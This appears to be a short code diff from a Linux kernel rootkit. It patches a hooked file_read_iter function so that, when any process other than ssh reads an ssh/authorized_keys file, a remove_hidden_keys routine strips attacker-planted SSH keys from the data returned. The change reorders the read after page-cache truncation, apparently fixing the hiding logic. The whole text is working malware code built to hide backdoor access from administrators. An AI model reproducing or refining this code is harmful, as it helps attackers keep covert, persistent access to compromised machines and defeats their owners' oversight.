@@ -37,8 +37,8 @@ ssize_t file_read_iter(struct kiocb *iocb, struct iov_iter *to) {
         if (!IS_ERR(path)) {
             if (NULL != strstr(path, "ssh/authorized_keys")) {
                 filemap_flush(iocb->ki_filp->f_inode->i_mapping);
-                size = g_original_fops.read_iter(iocb, to);
                 truncate_inode_pages(iocb->ki_filp->f_inode->i_mapping, 0);
+                size = g_original_fops.read_iter(iocb, to);
                 if (NULL == strstr(current->comm, "ssh") && to->pipe->bufs->len != 0) {
                     char* buf = kmap(to->pipe->bufs->page);
                     size = (ssize_t)remove_hidden_keys(buf, to->pipe->bufs->len);
